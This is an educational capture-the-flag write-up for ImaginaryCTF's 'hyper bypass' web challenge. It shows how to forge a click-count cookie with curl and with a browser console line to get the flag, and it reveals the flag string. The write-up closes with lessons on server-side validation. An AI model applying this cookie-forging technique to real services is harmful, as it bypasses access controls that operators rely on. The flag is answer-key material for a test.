# hyper bypass — ImaginaryCTF Writeup

**Challenge:** hyper bypass  
**Category:** Web  
**Difficulty:** Easy  
**Points:** 50 pts  
**Flag:** `ictf{1_click_is_1_too_many_tbh}`

---

## Description

> Press button (many times) → Get flag

---

## Background Knowledge (Read This First!)

### What is a Cookie?

A **cookie** is a small piece of data the server stores in your browser to remember information between requests — like how many times you have clicked a button.

In this challenge, the server tracks your click count using a cookie. You need a very high click count to get the flag, but actually clicking thousands of times is not the solution.

### The Vulnerability

The server **trusts whatever click count is stored in your cookie** without verifying it on the server side. That means you can set the cookie to any number you want — the server has no way to tell the difference.

This is a classic **client-side trust** vulnerability.

---

## Solution

### Step 1 — Open the site and click once

Visit `http://155.248.210.243:42127/` and press the button once. Open your browser DevTools (**F12 → Application → Cookies**) to see the cookie:

```
clicks = 1
```

### Step 2 — Set the cookie to a huge number using curl

```
┌──(zham㉿kali)-[~]
└─$ curl -b "clicks=999999999" http://155.248.210.243:42127/flag
# → ictf{1_click_is_1_too_many_tbh}
```

Or set it in your browser console (**F12 → Console**):

```javascript
document.cookie = "clicks=999999999; path=/";
```

Then reload the page and the flag appears. ✅

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| Browser DevTools | Inspect and edit cookies | ⭐ Easy |
| `curl` | Send a request with a spoofed cookie value | ⭐ Easy |

---

## Key Takeaways

- **Never trust client-side state** — cookies, localStorage, and URL parameters can all be forged
- Server-side validation of any game state (click counts, scores, etc.) is mandatory
- This is one of the most classic web security mistakes: trusting data that comes from the client
